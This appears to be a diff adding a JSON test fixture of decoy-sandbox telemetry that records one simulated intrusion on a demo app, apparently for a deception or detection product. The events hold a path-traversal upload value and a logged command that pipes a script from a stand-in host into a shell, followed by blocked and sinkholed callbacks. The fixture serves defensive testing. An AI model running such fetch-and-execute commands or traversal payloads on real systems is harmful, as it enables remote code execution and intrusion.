@@ -1,0 +1,141 @@
+{
+  "description": "One attempt against the demo app: a probe, an upload that reaches the vulnerable path, a loader that runs from memory, a DNS lookup and a blocked stage-2 fetch, then a DNS TXT callback. Nothing is written to disk, so there is no file hash (#34 validation).",
+  "events": [
+    {
+      "event_id": "mem-01",
+      "ts": 1792285323000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "info",
+      "src": { "ip": "203.0.113.50", "port": 51400 },
+      "dst": { "ip": "10.85.1.2", "port": 8080 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "data": { "method": "GET", "path": "/admin", "status": 404, "user_agent": "demo-loader/0.1 (+ops@example.invalid)" }
+    },
+    {
+      "event_id": "mem-02",
+      "ts": 1792285324000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": { "ip": "203.0.113.50", "port": 51400 },
+      "dst": { "ip": "10.85.1.2", "port": 8080 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../../dev/shm/.m&token=0f1e2d3c",
+        "status": 201,
+        "bytes": 61,
+        "user_agent": "demo-loader/0.1 (+ops@example.invalid)",
+        "body_sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
+      }
+    },
+    {
+      "event_id": "mem-03",
+      "ts": 1792285324004,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "high",
+      "src": { "ip": "203.0.113.50", "port": 51400 },
+      "dst": { "ip": "10.85.1.2", "port": 8080 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "trigger",
+        "sequence_no": 1,
+        "t_offset_ms": 4,
+        "notes": "resolved path escaped the upload root"
+      },
+      "data": {
+        "request_path": "/api/upload?path=../../../dev/shm/.m&token=0f1e2d3c",
+        "resolved_path": "/dev/shm/.m",
+        "request_slice_sha256": "fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9",
+        "request_slice_len": 61
+      }
+    },
+    {
+      "event_id": "mem-04",
+      "ts": 1792285324009,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "critical",
+      "src": { "ip": "203.0.113.50", "port": 51400 },
+      "dst": { "ip": "10.85.1.2", "port": 8080 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "post_exploit",
+        "sequence_no": 2,
+        "t_offset_ms": 9,
+        "cmd_lines": ["sh -c 'curl -s http://stage2.example.invalid/m.sh | sh'"],
+        "notes": "loader piped to a shell; nothing written to disk"
+      },
+      "data": { "memory_only": true }
+    },
+    {
+      "event_id": "mem-05",
+      "ts": 1792285325000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "medium",
+      "src": { "ip": "10.85.1.2", "port": 40001 },
+      "dst": { "ip": "10.85.1.1", "port": 53 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "data": { "query": "stage2.example.invalid", "qtype": "A", "verdict": "sinkholed" }
+    },
+    {
+      "event_id": "mem-06",
+      "ts": 1792285325100,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "egress",
+      "severity": "high",
+      "src": { "ip": "10.85.1.2", "port": 44110 },
+      "dst": { "ip": "192.0.2.80", "port": 80 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "data": { "verdict": "blocked", "host": "stage2.example.invalid", "method": "GET", "path": "/m.sh" }
+    },
+    {
+      "event_id": "mem-07",
+      "ts": 1792285330000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "high",
+      "src": { "ip": "10.85.1.2", "port": 40002 },
+      "dst": { "ip": "10.85.1.1", "port": 53 },
+      "tenant_id": "t1",
+      "source": { "kind": "host", "id": "host-1" },
+      "data": { "query": "k7f3q9.cb.example.invalid.", "qtype": "TXT", "verdict": "sinkholed" }
+    }
+  ]
+}
